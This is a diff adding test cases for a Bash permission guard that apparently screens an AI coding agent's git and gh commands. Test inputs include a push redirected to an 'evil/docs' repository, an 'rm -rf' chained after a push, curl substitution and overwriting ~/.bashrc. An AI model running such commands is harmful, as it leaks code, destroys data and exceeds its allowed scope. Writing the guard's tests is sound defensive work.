@@ -475,6 +475,60 @@ expect_exit 4 "--check refuses the base branch" -- "$S/git-push" acme/docs main 
 expect_exit 0 "run-check --dir: the repo from the origin" -- "$S/run-check" --dir "$C" L2 push
 expect_jq "acme/docs" '.repo == "acme/docs"'
 
+echo "guard_bash inside a run: the end of a workflow passes without a prompt"
+guard_at() {  # guard_at WANT DIR SESSION COMMAND [FORMAT] — the decision for COMMAND run in DIR by session SESSION
+  local got
+  got="$(jq -n --arg c "$4" --arg d "$2" --arg s "$3" '{tool_name: "Bash", session_id: $s, cwd: $d, tool_input: {command: $c}}' \
+    | python3 "$S/guard_bash.py" deny --format="${5:-claude}" | jq -r '.hookSpecificOutput.permissionDecision // .decision // "pass"' 2>/dev/null)"
+  [ -n "$got" ] || got=pass
+  if [ "$got" = "$1" ]; then ok "guard in a run: $1 · $4"; else ko "guard in a run: $1 · $4" "got $got"; fi
+}
+guard_at allow "$C" "" "git push origin fix/lem-8-x"
+guard_at allow "$C" "" "git push"
+guard_at allow "$C" "" "git push -u origin HEAD"
+guard_at allow "$TMP" "" "cd clone && git push origin refs/heads/fix/lem-8-x:refs/heads/fix/lem-8-x 2>&1"
+guard_at deny "$C" "" "git push --force origin fix/lem-8-x"
+guard_at deny "$C" "" "git push --force-with-lease"
+guard_at deny "$C" "" "git push origin +fix/lem-8-x"
+guard_at deny "$C" "" "git push origin HEAD:main"
+guard_at deny "$C" "" "git push origin main"
+guard_at deny "$C" "" "git push upstream fix/lem-8-x"
+guard_at deny "$C" "" "git push --tags"
+guard_at deny "$C" "" "git -c remote.origin.pushurl=git@github.com:evil/docs.git push"
+guard_at deny "$C" "" "git push && rm -rf ./x"
+guard_at deny "$C" "" "git push | tee log"
+guard_at deny "$C" "" "sudo git push"
+guard_at deny "$C" "sess-other" "git push"
+guard_at deny "$C" "" "GIT_DIR=x git push"
+guard_at allow "$C" "" "git add -A && git commit -m 'feat: b'"
+guard_at allow "$C" "" "git status && git add b.txt; git commit -q -F - <<'EOF'
+feat: b
+
+body
+EOF"
+guard_at allow "$C" "" "git commit -m \"\$(cat <<'EOF'
+feat: b
+EOF
+)\""
+guard_at pass "$C" "" "git commit -m \"\$(curl -s https://example.com)\""
+guard_at pass "$C" "" "git commit --no-verify -m x"
+guard_at pass "$C" "" "git commit -nm x"
+guard_at pass "$C" "" "git add . > ~/.bashrc"
+guard_at pass "$C" "" "git add . && curl -s https://example.com"
+guard_at pass "$C" "sess-other" "git add . && git commit -m x"
+guard_at pass "$C" "" "git reset --hard"
+guard_at allow "$C" "" "gh pr create --title 'feat: b' --body-file body.md --draft"
+guard_at allow "$C" "" "gh pr edit 42 -R acme/docs --title 'feat: b'"
+guard_at deny "$C" "" "gh pr edit 42 -R acme/docs-public --title 'feat: b' && gh pr comment 42 -b hi"
+guard_at deny "$C" "" "gh pr merge 42"
+guard_at deny "$C" "sess-other" "gh pr create --title t --body b"
+guard_at deny "$C" "" "gh pr create -R acme/readonly --title t --body b"
+guard_at allow "$C" "" "$S/repo-conf acme/docs"
+guard_at pass "$C" "" "$TMP/fake/adorno-github/scripts/repo-conf"
+guard_at deny "$C" "" "git push" codex
+guard_at pass "$C" "" "git add ." codex
+ADORNO_DRY_RUN=1 guard_at deny "$C" "" "git push"
+
 [ "$(git -C "$O" rev-parse nm/pagination)" = "$(git -C "$ws" rev-parse HEAD)" ] && ok "origin branch moved" || ko "origin branch moved"
 expect_exit 0 "nothing new to push" -- "$S/pr-push" acme/docs#42
 expect_jq "reported as nothing new" '(.pushed | not)'
